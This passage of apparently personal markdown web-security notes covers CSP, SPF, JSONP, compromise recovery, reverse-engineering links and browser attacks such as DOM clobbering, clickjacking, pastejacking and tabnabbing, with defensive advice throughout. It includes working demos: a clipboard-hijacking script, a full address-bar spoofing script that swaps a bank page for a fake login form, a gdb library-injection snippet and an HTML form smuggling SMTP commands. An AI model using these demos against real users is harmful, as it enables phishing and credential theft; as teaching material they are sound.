See also as example GitHub ultra strict CSP.

Exception of inline script and style can be made with `script-src` and `style-src` by using a checksum/hash of source code of inlined script. Note: nonce can also be used, but not recommended. See [Content Security Policy Level 2](https://www.w3.org/TR/CSP2/#script-src-hash-usage)

- [Subresource checksum](../Web/Web.md#subresource-checksum)
- [Content-Security-Policy - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [Making CSP great again! - Michele Spagnuolo and Lukas Weichselbaum // Speaker Deck](https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum)
- [GitHub’s CSP journey - GitHub Engineering](https://githubengineering.com/githubs-csp-journey/)
- [GitHub’s post-CSP journey - GitHub Engineering](https://githubengineering.com/githubs-post-csp-journey/)
- [CSP Tester](https://jeffersonscher.com/res/csp-tester.php)
- [Content Security Policy Playground](http://www.cspplayground.com/home)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Content Security Policy — Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [Implementing Content Security Policy ★ Mozilla Hacks – the Web developer blog](https://hacks.mozilla.org/2016/02/implementing-content-security-policy/)
- [Content Security Policy CSP Reference & Examples](https://content-security-policy.com/)

### SPF

Aka Sender Policy Framework, email authentication

Example:

```dns-zone
@ IN TXT "v=spf1 a include:_spf.google.com ~all
```

where:

- `a`: authorizes the host(s) identified in the domain's `A` record(s) to send e-mail
- `include:`: authorizes mail to be sent on behalf of the domain from `google.com`
- `~all`: denotes that this list is all inclusive, and no other servers are allowed to send e-mail

- [Sender Policy Framework - Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)
- [How To use an SPF Record to Prevent Spoofing &amp; Improve E-mail Reliability | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-use-an-spf-record-to-prevent-spoofing-improve-e-mail-reliability)
- [RFC 4408 - Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1](https://tools.ietf.org/html/rfc4408)

### JSONP

**Avoid using JSONP on sensitive domains. Use a dedicated sandbox domain.**

Use `X-Content-Type-Options: nosniff` and `Content-Type: application/javascript`. Return something like `/**/ typeof CALLBACK === "function" && CALLBACK(JSONP_RESPONSE);`, where `CALLBACK` is the callback name and `JSONP_RESPONSE` is the response

- [Abusing JSONP with Rosetta Flash](https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/)

### Image forensic

Find hidden data of faked data (ex: image):

- [FotoForensics](http://fotoforensics.com/)
- [Fool Me Once - The Hacker Factor Blog](http://www.hackerfactor.com/blog/?/archives/478-Fool-Me-Once.html)
- [bh-usa-07-krawetz-wp.pdf](https://www.hackerfactor.com/papers/bh-usa-07-krawetz-wp.pdf)
- [FotoForensics - FAQ](http://fotoforensics.com/faq.php?show=General&c=guidelines)
- [TinEye Reverse Image Search](https://www.tineye.com/)
- [Forensically, free online photo forensics tools - 29a.ch](https://29a.ch/photo-forensics/)
- [Ghiro - automated digital image forensics tool](http://www.getghiro.org/) - see https://github.com/ghirensics/ghiro
- [An Overview on Image Forensics](https://www.hindawi.com/journals/isrn/2013/496701/)

## Reaction to violation

And recover, hijacking, pirated, hacked

> giving the attackers feedback that he has been identified helps him find your protection mechanism

- Wait adequate moment to act (ex.: let people play and cheat several days, and ban all detected players)
- offer them a discount to buy a copy
- (game) enclose cheaters in a "parallel world of cheaters" where they can play without disturbing non cheaters players (matchmaking): (multiplayer games) play togethers, (games with ranked score) cheated ranks only viewable by cheaters themself (but still see non cheated ranks)
- (game) make the game really harder or impossible: set invisibility to (random) enemies, add visual glitches, unpredictable/inaccurate interactions (less precise click and keys), trap the player in the scenario
- [Logic bomb — Wikipedia](https://en.wikipedia.org/wiki/Logic_bomb)
- [Video Game Cheaters Outed By Logic Bombs - Slashdot](https://games.slashdot.org/story/16/02/02/1732254/video-game-cheaters-outed-by-logic-bombs)
- [Eight of the Most Hilarious Anti-Piracy Measures in Video Games - IGN](http://www.ign.com/articles/2013/04/29/eight-of-the-most-hilarious-anti-piracy-measures-in-video-games)
- [12 hilarious, brutally devious ways game developers punish pirates | PCWorld](http://www.pcworld.com/article/2602876/software-games/10-hilarious-brutally-devious-ways-pc-game-developers-punish-pirates.html)
- "cyber-blurring": create fake email accounts, complete with phony documents, to confuse the attackers. "false accounts, with false content, as traps" (forged phishing emails)
	- [Hackers Came, but the French Were Prepared - The New York Times](https://www.nytimes.com/2017/05/09/world/europe/hackers-came-but-the-french-were-prepared.html)
	- [Macron hackers linked to Russian-affiliated group behind US attack | World news | The Guardian](https://www.theguardian.com/world/2017/may/08/macron-hackers-linked-to-russian-affiliated-group-behind-us-attack)

```php
// Wget troll
if(!empty($_SERVER['HTTP_USER_AGENT']) && preg_match('/Wget/', $_SERVER['HTTP_USER_AGENT'])){
	header('Location: ftp://speedtest.tele2.net/1000GB.zip', true, 302);
}
```

### Recover compromised account

**Always check settings.** Ex: check if emails are not redirected (to catch bank informations, etc.)

- [Que faire si votre compte mail est piraté ?](http://lecollectif.orange.fr/articles/faire-compte-mail-pirate/)

### Recover compromised website

**Verify before restore if the backup is not affected too.**

- [Are You Prepared Against A Hack? – Smashing Magazine](https://www.smashingmagazine.com/2014/05/are-you-prepared-against-a-hack/)
- [What to do if your WordPress site is hacked- OVH](https://www.ovh.co.uk/g1874.what_to_do_if_your_wordpress_site_is_hacked)

### Recover compromised server

- [hacking - How do I deal with a compromised server? - Server Fault](http://serverfault.com/questions/218005/how-do-i-deal-with-a-compromised-server)
- [Steps for Recovering from a UNIX or NT System Compromise](http://www.cert.org/historical/tech_tips/win-UNIX-system_compromise.cfm)

## Hacking

See [Prevent and detect violation](#prevent-and-detect-violation)

```sh
# mach injection hack
# From https://github.com/mschrag/slowmo
cat <<EOM | gdb -quiet > /dev/null
attach $SIM_PID
p (void *)dlopen("$(cd "$(dirname "$0")"; pwd)/mach.bin", 2)
detach
EOM
# Then start targeted app
```

```sh
sudo fs_usage -w -f filesys | grep "file_used.ext"
```

- [Cracking Sublime Text 3](http://blog.fernandodominguez.me/cracking-sublime-text-3/)
- [A collection of resources for linux reverse engineering](https://github.com/michalmalik/linux-re-101)
- [How to Crack Just About Any Mac App (and How to Prevent It)](http://lifehacker.com/5736101/how-to-crack-just-about-any-mac-app-and-how-to-prevent-it)
- [Hopper](https://www.hopperapp.com/)
- [Ghidra](https://ghidra-sre.org/) - [Ghidra.app launcher for OSX](https://gist.github.com/yifanlu/e9965cdb148b550335e57899f790cad2)
- [Mobile Security Wiki](https://mobilesecuritywiki.com/) - see https://github.com/exploitprotocol/mobile-security-wiki
- [Reverse engineering](http://en.wikipedia.org/wiki/Reverse_engineering)
- [Programming Linux Anti-Reversing Techniques by Jacob Baines \[PDF/iPad/Kindle\]](https://leanpub.com/anti-reverse-engineering-linux) (see [the PDF](anti-reverse-engineering-linux.pdf)) https://github.com/antire-book/dont_panic
- [IDA](https://www.hex-rays.com/products/ida/)
- [Linux_Anti_Debug.pdf](Linux_Anti_Debug.pdf)
- [Eldad_Eilam-Reversing__Secrets_of_Reverse_Engineering-Wiley(2005).pdf](Eldad_Eilam-Reversing__Secrets_of_Reverse_Engineering-Wiley(2005).pdf)
- [anti-reverse-engineering-linux.pdf](anti-reverse-engineering-linux.pdf)
- [How to Reverse Engineer OS X and iOS Software](https://davidwalsh.name/reverse-engineer-os-ios-software)
- [OS X and iOS Reverse Engineering: How to Reverse Engineer an iOS App](https://www.apriorit.com/dev-blog/363-how-to-reverse-engineer-os-x-and-ios-software)
- [Software Reverse Engineering Tools](https://www.apriorit.com/dev-blog/366-software-reverse-engineering-tools)
- [Reverse-engineering Instagram to access the private API](http://blog.will3942.com/reverse-engineering-instagram) - By modify Instagram Android App APK
- [REC Decompiler Home Page](http://www.backerstreet.com/rec/rec.htm) - Tool to reverse compilation. Recognises "signature" assembly code that compilers generate for program structures such as conditionals (if, else, switch) and loops (for, do, while) and generates C like code
- [Reverse Engineering Linux x86 Binaries](http://althing.cs.dartmouth.edu/local/reverse-talk.pdf)
- [Frida • A world-class dynamic instrumentation framework - Inject JavaScript to explore native apps on Windows, macOS, Linux, iOS, Android, and QNX](https://www.frida.re/) - See [Frida, la nouvelle amie des reversers et hackers - virtualabs.fr](http://www.virtualabs.fr/Frida-la-nouvelle-amie-des)
- [Reversing d’applications Android - virtualabs.fr](http://www.virtualabs.fr/Reversing-d-applications-Android)
- [How to recover lost Python source code if it's still resident in-memory](https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12)
- [SpiderMonkey | Didier Stevens](https://blog.didierstevens.com/programs/spidermonkey/) - Use a modified ECMAScript engine to desofuscate code
- [Digital Whisper :: עמוד הגליונות](http://www.digitalwhisper.co.il/Issues/) - Resource in Hebrew, but with code chunks and captures
- anti-debugger protection - [Anti Reverse Engineering Protection Techniques to Use Before Releasing Software](https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software)
- ECMAScript: Object in can be used as scalar values (called [primite values](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Primitive_values)) via the [`Object#valueOf()` method](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf): `let randomNumber = {valueOf(){return Math.random(), toString(){return Math.random()}}}; randomNumber + 1;// 1.3751036170372646 <- random value`. See also [`Symbol.toPrimitive`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/toPrimitive): `let randomNumber = {[Symbol.toPrimitive](hint){return Math.random()}}`
- [Hooked on Mnemonics Worked for Me: A Primer on Cracking XOR Encoded Executables](http://hooked-on-mnemonics.blogspot.fr/2017/04/a-primer-on-cracking-xor-encoded.html)
- [FlexiSpy hack](https://pastebin.com/raw/Y1yf8kq0)
- [RE guide for beginners: Methodology and tools - Reverse Engineering - 0x00sec](https://0x00sec.org/t/re-guide-for-beginners-methodology-and-tools/2242)
- [Exploring OS X Preview Signatures – mikeymikey blogs here](http://michaellynn.github.io/2015/07/26/exploring-os-x-preview-signatures/) - Decode data from macOS Preview Signatures
- [class-dump - Steve Nygard](http://stevenygard.com/projects/class-dump/) - Generates declarations for the classes, categories and protocols from Objective-C runtime information stored in Mach-O files
- [w0lfschild/macOS_headers: A consistently maintained dump of most macOS Headers](https://github.com/w0lfschild/macOS_headers)
- [RE for Beginners | Reverse Engineering](https://www.begin.re/)
- [Reverse Engineering Stickies.app - Low Level Bits](https://lowlevelbits.org/reverse-engineering-stickies.app/)
- [Nightmare - Nightmare](https://guyinatuxedo.github.io/) - "Nightmare is an intro to binary exploitation / reverse engineering course based around ctf challenges."

### Alternative data storage

See also [Steganography](#steganography)

Use (abuse) special cases where the data storage have different (better) quota limitation:

- Google Docs take up 0 bytes of quota in your Google Drive
- 1 TB of free storage for Flickr users (images only)
- Amazon Drive: the Prime Photos plan offers unlimited storage for photos and RAW files
- Google Docs store complete history version of the document (keystrokes?)
- YouTube imposes no limits on the total number or length of videos users can upload, pixels of each frames to store data
- URL shorteners
- Gmail allow in 2006 a large amount of storage for email attachments
- Usenet store data files
- create multi accounts

Inject data ZIP at the end of a valid image, for platform that don't reencode/destroy appended data to images (ex: GIF)

- [How to Use Your New Terabyte of Free Flickr Storage for More Than Just Photos Using This Hack « Digiwonk :: Gadget Hacks](https://digiwonk.gadgethacks.com/how-to/use-your-new-terabyte-free-flickr-storage-for-more-than-just-photos-using-hack-0147022/)
- [At the risk of "ruining" it for some users, Amazon doesn't appear to validate no... | Hacker News](https://news.ycombinator.com/item?id=13998534)
- [GmailFS - Gmail Filesystem](https://web.archive.org/web/20060424165737/http://richard.jones.name/google-hacks/gmail-filesystem/gmail-filesystem.html)
- [dzhang314/YouTubeDrive: Store files as YouTube videos == infinite disk space](https://github.com/dzhang314/YouTubeDrive)
- [stewartmcgown/uds: Unlimited Drive Storage by splitting binary files into base64](https://github.com/stewartmcgown/uds)
- [tuxxy/BandcampFS: BandcampFS is a proof of concept that allows people to backup files to bandcamp.com via WAV files.](https://github.com/tuxxy/BandcampFS)
- [hansendc/gmailfs: FUSE-based filesystem for using an IMAP server (like gmail) as normal storage like a hard disk.](https://github.com/hansendc/gmailfs)
- [NZB — Wikipedia](https://en.wikipedia.org/wiki/NZB)
- [Usenet — Wikipedia](https://en.wikipedia.org/wiki/Usenet#Binary_content)
- [DNSFS. Store your files in others DNS resolver caches](https://blog.benjojo.co.uk/post/dns-filesystem-true-cloud-storage-dnsfs) - [DNSFS – Store files in others' DNS resolver caches | Hacker News](https://news.ycombinator.com/item?id=16134041)
- [WarrenGreen/InfiniteDrop: Distributed FileSystem across Dropbox accounts](https://github.com/WarrenGreen/InfiniteDrop)

## Vulnerabilities

See [Know your weaknesses](#know-your-weaknesses)

- Fake hotspot: [Wifi ouvert - Attention aux faux hotspot ! (+ une démo avec un module Arduino) - Korben](http://korben.info/wifi-ouvert-attention-aux-faux-hotspot-demo-module-arduino.html?utm_source=dlvr.it&utm_medium=twitter)
- [Malware in the browser: how you might get hacked by a Chrome extension](https://kjaer.io/extension-malware/)
- [Real Future: What Happens When You Dare Expert Hackers To Hack You (Episode 8) - YouTube](https://www.youtube.com/watch?v=bjYhmX_OUQQ)
- [Crooks can guess Visa card details in six seconds by querying lots of websites at once / Boing Boing](https://boingboing.net/2016/12/04/crooks-can-guess-visa-card-det.html)
- [Category:Computer security stubs — Wikipedia](https://en.wikipedia.org/wiki/Category:Computer_security_stubs)
- [Category:Computer security exploits — Wikipedia](https://en.wikipedia.org/wiki/Category:Computer_security_exploits)
- [Category:Web security exploits — Wikipedia](https://en.wikipedia.org/wiki/Category:Web_security_exploits)
- [Category:Algorithmic complexity attacks — Wikipedia](https://en.wikipedia.org/wiki/Category:Algorithmic_complexity_attacks)
- [Deadlock — Wikipedia](https://en.wikipedia.org/wiki/Deadlock)
- [CWE - 2011 CWE/SANS Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/index.html#Listing)
- [OWASP Top Ten Cheat Sheet - OWASP](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet)
- [Category:OWASP Top Ten Project - OWASP](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
- [Detecting the use of "curl | bash" server side | Application Security](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)
- [Category:Vulnerability - OWASP](https://www.owasp.org/index.php/Category:Vulnerability)
- [Minded Security Blog: Ye Olde Crockford JSON regexp is Bypassable](http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html)
- [Hacking Printers](http://hacking-printers.net/wiki/index.php/Main_Page) [Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- Fixes for previous version don't be protected against new language possibilities [ECMAScript 6 from an Attacker's Perspective - Breaking Frameworks, Sa…](http://www.slideshare.net/x00mario/es6-en)
- Graphics Interchange Format Java Archives (GIFAR) malware [Gifar - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Gifar)
- [A Chip Flaw Strips Away a Key Hacking Safeguard for Millions of Devices | WIRED](https://www.wired.com/2017/02/flaw-millions-chips-strips-away-key-hacking-defense-software-cant-fully-fix/amp/) - See [AnC - VUSec](https://www.vusec.net/projects/anc/)
- [Web Security Research» Alex's Corner: HTTP Range & Request-Range Request Headers](http://kuza55.blogspot.fr/2008/02/http-range-request-range-request.html) - Flash block scripts that write HTTP header `Range`, but not `Request-Range` (blocked starting Flash 9.0.115). Apache support both. See [Troubleshoot ActionScript error in Flash Player](https://helpx.adobe.com/flash-player/kb/actionscript-error-send-action-contains.html)
- [lame hackers guide: Weaponizing PostScript](https://lamehackersguide.blogspot.fr/2017/02/weaponizing-postscript.html) - PostScript vulnerability: open files
- [ServiceWorker is dangerous](https://alf.nu/ServiceWorker) - ServiceWorker on subdomain with pages contains user's scripts
- [HTTP Parameter Pollution with cookies in PHP | Application Security](https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/) - Coookie pollution using rogue cookie: `session_id=123` = `session_id%00blah==123`
- [Hostile Subdomain Takeover using Heroku/Github/Desk + more](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/) - hacked via DNS subdomain takeover via DNS entries for a domain people aren’t aware of.
- [Broken Browser – Fun with Browser Vulnerabilities](http://www.brokenbrowser.com/)
- [Exploits Database by Offensive Security](https://www.exploit-db.com/)

Fuzzing test

About fuzzing test with JPEG data:

> It starts with an invalid .jpg (literally a text file containing "hello"), and by trying over and over, changing random bytes and tracing the execution of the decoder program as it is fed the corrupted input, it will drill deeper and deeper into the program until it has gotten far enough that the input is actually a valid .jpg, without any human input.
> 
> Fuzzing like this is a very effective technique for finding (security) bugs in programs that parse input, because you will quickly end up with "impossible" input nobody thought to check for (but is close enough that it won't be rejected outright), and whoops there's your buffer overflow.
> [...]
> it just finds one input that makes the program exit with exit code zero (for success)
— [Pulling JPEGs out of thin air | Hacker News](https://news.ycombinator.com/item?id=8571879)

- [Fuzzing — Wikipedia](https://en.wikipedia.org/wiki/Fuzzing)
- [lcamtuf's blog: Pulling JPEGs out of thin air](https://lcamtuf.blogspot.fr/2014/11/pulling-jpegs-out-of-thin-air.html) - Use genetic algorithm to generate data that test vulneratilities. See [american fuzzy lop](http://lcamtuf.coredump.cx/afl/)

Four General Attack-Vectors:

- A1: Attacking the Sandbox
- A2: Attacking the Sanitizer
- A3: Attacking the CSP Mode
- A4: Attacking the Codebase

### Libraries

Front end, back end. Third party or internal. **Update it as soon as possible.**

- [Thou shalt not depend on me: analysing the use of outdated JavaScript libraries on the web | the morning paper](https://blog.acolyer.org/2017/03/07/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/)

### Spoofed UI

Look like phishing / spoofing trusted UI

- [The Line of Death – text/plain](https://textslashplain.com/2017/01/14/the-line-of-death/)
- fullscreen document (can display a fake OS / browser UI)
- [Beware! Don't Fall For "Font Wasn't Found" Google Chrome Malware Scam](http://thehackernews.com/2017/02/HoeflerText-font-chrome.html)
- [Clickjacking](#clickjacking)
- [Tabnabbing and Address Bar Spoofing](#tabnabbing-and-address-bar-spoofing)
- [Pastejacking](#pastejacking)
- [Fake History](#fake-history)
- [Email spoofing — Wikipedia](https://en.wikipedia.org/wiki/Email_spoofing)
- [Phishing — Wikipedia](https://en.wikipedia.org/wiki/Phishing)
- [The Attack of the Alerts and the Zombie Script – Broken Browser](https://www.brokenbrowser.com/zombie-alert/)

### DOM clobbering

**Don't name your inputs or buttons `submit`, `action`, `method`, `style`, `dataset`, `id`, `attributes`, `children`, etc.**

```html
<form id="form" action="somewhere" method="post">
	<input type="text" name="action" value="pay">
	<input type="text" name="method" value="credit-card">
	<input type="text" name="attributes" value="something">
	<button name="submit">Send</button>
<form>
<script>
	let form = document.getElementById("form");
	form === window.form
	form.action// HTMLInputElement instead of String "somewhere"
	form.method// HTMLInputElement instead of String "post"
	form.submit// HTMLButtonElement instead of Function
	form.attributes// HTMLInputElement instead of NamedNodeMap
</script>

<div id="myId"></div>
<script>
myId                            // [object HTMLDivElement]
myId.id                         // "myId"
window.myId.id                  // "myId"
this.myId.id                    // "myId"
self.myId.id                    // "myId"
top.myId.id                     // "myId"
"myId" in window                // true
window.hasOwnProperty("myId")   // true
</script>
```

An implicit id can't have the same name as a protected JS keyword and can't overload a native global var, such as `window.screen`:

```html
<div id="function"></div>
<script>console.log(function) // SyntaxError: Unexpected token</script>
```

```html
<p id="alert">Some message</p>
<script>console.log(alert)// ƒ alert() { [native code] }</script>
```

- [Named access on the Window object - HTML Standard](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object)
- [DOM clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
- [In the DOM, no one will hear you scream](https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream)
- [cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo:](https://github.com/cure53/DOMPurify)
- [DOMLint - Test suite against HTML/DOM conflicts](https://kangax.github.io/domlint/)
- [Microsoft/JSanity: A secure-by-default, performance, cross-browser client-side HTML sanitization library](https://github.com/Microsoft/JSanity)
- [JavaScript variable names you shouldn’t use - NCZOnline](https://www.nczonline.net/blog/2007/06/03/javascript-variable-names-you-shouldn-t-use/)
- [Unsafe Names for HTML Form Controls](http://www.jibbering.com/faq/names/)
- [Implicit getElementById's](https://xem.github.io/articles/getelementbyid.html)
- [Clobbering the clobbered — Advanced DOM Clobbering - terjanq - Medium](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)
- [JSLR](http://www.thespanner.co.uk/2012/06/05/jslr/)

### Clickjacking

```js
if (self !== top) {
	document.body.style.display = "none";
	top.location = self.location;
}
```

Use header `Content-Security-Policy: frame-ancestors 'self'` (or the depreciated `X-Frame-Options: SAMEORIGIN`)

- [CSP Policy Directives - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors)
- [X-Frame-Options - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [Clickjacking Defense Cheat Sheet - OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)
- [Custom animated cursor via canvas / Stoyan's phpied.com](http://www.phpied.com/custom-animated-cursor-via-canvas/) can be used for clickjacking the browser UI (see https://jameshfisher.github.io/cursory-hack/)

### Pastejacking

After a copy action:

```html
<pre>echo "not evil"</pre>
<script>
// Hijack copied data and put an evil command
document.addEventListener("copy", event => {
	console.log(event);
	event.clipboardData.setData("text/plain", "echo \"evil\"\r\n");
	event.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
});
</script>
```

After other action (with or without timeframe): keydown, (inputs) change, click, dblclick, mouseup, (inputs) reset, (form) submit
Even if the timeframe is not supported, you can add delay after the action by using infinite loop over a short periode of time: the user use keyboard to copy (Crtl+C/Cmd+C) wait 800ms (limited by the maximum execution time limit for long-running scripts) and overwrite the copied value

- [A demo of overriding what's in a person's clipboard](https://github.com/dxa4481/Pastejacking)
- "Event handlers that are allowed to modify the clipboard" [Clipboard API and events](https://www.w3.org/TR/clipboard-apis/#event-handlers-that-are-allowed-to-modify-the-clipboard)
- "algorithm is allowed to show a popup" [5 Loading Web pages — HTML5](https://www.w3.org/TR/html5/browsers.html#allowed-to-show-a-popup)
- [Document.execCommand() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand#Browser_compatibility)
- [copy - Event reference | MDN](https://developer.mozilla.org/en-US/docs/Web/Events/copy)
- [clipboardData object (Internet Explorer)](https://msdn.microsoft.com/en-us/library/ms535220%28v=vs.85%29.aspx) https://developer.microsoft.com/en-us/microsoft-edge/platform/status/clipboardapi/ https://connect.microsoft.com/IE/feedback/details/1572456/edge-clipboard-api-text-html-content-messed-up-in-event-clipboarddata

### Tabnabbing and Address Bar Spoofing

Link and `target="_blank"` or `window.open()`

```html
<a href="http://host/maliciousepage.html" target="_blank">My profile on an other network</a>
```

It's a security issue if the link is provided by user or if the original link has been hacked/squatted (owner change), in the target document `window.opener` is accessible and can change it `location`.

Use [`rel="noreferrer"`](https://html.spec.whatwg.org/multipage/semantics.html#link-type-noopener) (`window.opener` - opener browsing context - will be nulled) or use a redirect mechanism (http://host/redirect?signature=XXXXXX&url=XXXX) will set `window.opener` to null then redirect:

```http
HTTP/1.0 200 OK
<head><noscript><meta http-equiv="refresh" content="0;URL='__final_url__'"></noscript><title>__final_url__</title></head><script>window.opener=null;location.replace("__final_url__")</script>
```

Or use JavaScript:

```js
let target = window.open("about:blank"/*other params*/);
target.document.write(`<script>window.opener=null;location.replace("${url}")</script>`);
// data URI can't be used here because of IE. You can use blob URI, but it's not pratical because we need to revoke the object URL once the popup is loaded
```

- [Tabnabbing attack on Facebook](https://gist.github.com/mems/df881c9495b6744b650c)
- [Tabnabbing — Wikipedia](https://en.wikipedia.org/wiki/Tabnabbing)
- [Phishing by navigating browser tabs - Bughunter University](https://sites.google.com/site/bughunteruniversity/nonvuln/phishing-with-window-opener)
- [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/)
- [Window.opener - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener)
- [Issue 156712 - chromium - html anchors set window.opener (spoofing/phishing threat) - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=156712)
- [Links to Unrelated Browsing Contexts - WHATWG Wiki](https://wiki.whatwg.org/wiki/Links_to_Unrelated_Browsing_Contexts)
- [Target="_blank" is an underestimated vulnerability | Hacker News](https://news.ycombinator.com/item?id=11631292)
- [Login-stealing phishing sites conceal their evil with lots of hyphens in URL | Ars Technica](https://arstechnica.com/security/2017/06/phishing-attacks-target-mobile-browsers-with-dash-padded-urls/)

Opener attack opened (inverse technique):

```html
<script>
/*
If you don't get it, banking.beaver-peak.us is a trusted banking website;
everything else is attacker-controlled. We begin by opening the legitimate
banking website, and giving the user enough time to examine the address bar.

There is a common misconception that changing the URL must result in a visible
page transition that alerts the user to foul play, but that's not the case.

PS. In older versions of Firefox, where the http:// prefix is not hidden,
this will look a bit less convincing due to the misalignment of URLs. Easy to
fix, but upgrade your browser already.

PPS. Bonus question: can you do something useful by flipping two pages
very rapidly, especially with history.*? What are the implications for
clickjacking & friends?
*/
var spaces = 
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          ";
var bank_html =
  '<title>Beaver Peak Banking and BBQ</title>' +
  '<img src="http://banking.beaver-peak.us/banking_interface/beaver-peak.jpg" style="float: left; margin-right: 10px">' +
  '<font size=+3 color=steelblue><b>Beaver Peak Banking and BBQ</b></font><br>' +
  '<i>"Best steaks in town!"</i> -- Creek and Brook Daily<br clear="all"><p> ' +
  '<font color=crimson>Security tip: confirm that <i>http://banking.beaver-peak.us/</i> is present in the address bar!</font>' +
  '<p><b>Please login to our secure banking system:</b><p><table><tr><td>Login:</td><td><input type=text></td></tr><tr>' +
  '<td>Password:</td><td><input type=password></td></tr></table><p><input type=submit value="Log in!">' +
  '<p><div style="border-width: 1px 0 0 0;border-color:steelblue; border-style:solid">' +
  '<font color=gray size=-1>Member FDIC. FDA certified. Truck parking available.</font></div>';

var originalURL = 'http://banking.beaver-peak.us/banking_interface/';
var fakeURL = 'http://banking.coredump.cx/us/banking_interface/';
function dostuff() {
  /* Precache */
  if (navigator.userAgent.indexOf('; MSIE') != -1) {
    var x = new Image();
    x.src = fakeURL;
  }
  w = window.open(originalURL, 'target');
  setTimeout(dostuff2, 7500);
}

function dostuff2() {
  if (navigator.userAgent.indexOf('; MSIE') != -1)
    w.open(fakeURL,'target');
  else if (navigator.userAgent.indexOf('Opera/') != -1)
    w.location.replace('data:text/html;charset=UTF-8,.beaver-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
  else
    w.location.replace('data:text/html;charset=UTF-8,-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
}
</script>
<p>illustrates the effectiveness of using
data: or precached content to do the deed. Should work neatly in
up-to-date browsers. You're probably fooling yourself if you 
think you'd reliably spot this happening to you in the wild.</p>
<a href="http://banking.beaver-peak.us/banking_interface/" onclick="dostuff()">Beaver peak bank</a>
```

- [lcamtuf's blog: The old switcharoo](http://lcamtuf.blogspot.fr/2011/12/old-switcharoo.html)
- [The old seamless switcharoo](http://lcamtuf.coredump.cx/switch/)
- [You sniff MIME / assume HTML on what?](http://lcamtuf.coredump.cx/switch/index2.html)
- [lcamtuf's blog: Yes, you can have fun with downloads](http://lcamtuf.blogspot.fr/2012/05/yes-you-can-have-fun-with-downloads.html)
- [Fake download](http://lcamtuf.coredump.cx/fldl/)
- [Download demo](http://hallvord.com/temp/moz/dl.htm)
- [Google Chrome, Firefox Address Bar Spoofing Vulnerability - Miscellaneous Ramblings of A Hacker](http://www.rafayhackingarticles.net/2016/08/google-chrome-firefox-address-bar.html)
- [Sebastian Kaspari on Twitter: "The URL in @FennecNightly is now scrollable and will be scrolled to the "base domain" by default. CC @gcpascutto (Thanks @buttercookie42) https://t.co/KRhDqfOLpo"](https://twitter.com/Anti_Hype/status/907948793047416832)

Use Multipart replace resource:

- [Page Loading: multipart test 1: Kitchen](https://hixie.ch/tests/evil/page-loading/multipart/001.cgi)
- [Page load processing model for `multipart/x-mixed-replace` resources](https://www.w3.org/TR/html5/single-page.html#read-multipart-x-mixed-replace)

Interrupt navigation and rewrite content of the document

```js
// Navigate to other document... then:
window.onunload = function()
{
	document.execCommand("stop");
	setTimeout('document.write("Spoofed URL on Edge");document.close();');
}
```

- [Microsoft Edge - AddressBar Spoof](http://www.cracking.com.ar/demos/edgespoof/2/)
- https://mobile.twitter.com/magicmac2000/status/779339530872692737

### DNS rebinding

- [DNS rebinding — Wikipedia](https://en.wikipedia.org/wiki/DNS_rebinding)

### Fake History

- [Stealing the users back button with the History API – Ryan Seddon](https://www.thecssninja.com/javascript/stealing-history-api)

### HTTP/0.9 vulnerability

Response without HTTP overhead "HTTP/1.0 200 OK" nor any header, just the content

Allow potential XSS attacks to ASCII protocols (like SMTP, NNTP, POP3, IRC, etc.) via POST requests

```html
<form method="post" action="http://mail.example.org:25/">
	<textarea>
HELO example.com
MAIL FROM:<somebody@example.com>
RCPT TO:<recipient@example.org>
DATA
Subject: Hi there!
From: somebody@example.com
To: recipient@example.org
Hello world!
.
QUIT
	</textarea>
</form>
<!--
The result will be:
220 mail.example.org ESMTP Hi there!
500 Command unrecognized
[...]
500 Command unrecognized
250 mail.example.org Hello example.com [10.11.12.13]
250 <somebody@example.com> is syntactically correct
